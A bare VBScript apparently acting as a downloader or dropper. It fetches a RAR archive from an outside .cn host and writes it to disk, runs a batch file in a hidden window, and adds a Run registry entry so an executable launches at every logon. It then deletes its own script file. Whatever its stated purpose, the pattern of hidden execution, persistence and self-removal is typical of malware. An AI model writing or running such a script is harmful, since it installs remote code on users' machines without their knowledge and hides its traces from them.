Set xPost = CreateObject("Microsoft.XMLHTTP")  
xPost.Open "GET","http://www.virtualvisit.cn/update/VVT.rar",0  
xPost.Send()  
Set sGet = CreateObject("ADODB.Stream")  
sGet.Mode = 3  
sGet.Type = 1  
sGet.Open()  
sGet.Write(xPost.responseBody)  
sGet.SaveToFile "vvt.rar",2  

Set shell = Wscript.createobject("wscript.shell")
a = shell.run ("1.bat",0)

set ws=wscript.createobject("wscript.shell")
ws.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\VirtualVisit","C:\Program Files\VVT\VVisit.exe","REG_SZ"

set fso=createobject("scripting.filesystemobject")
fso.deletefile "1.vbs"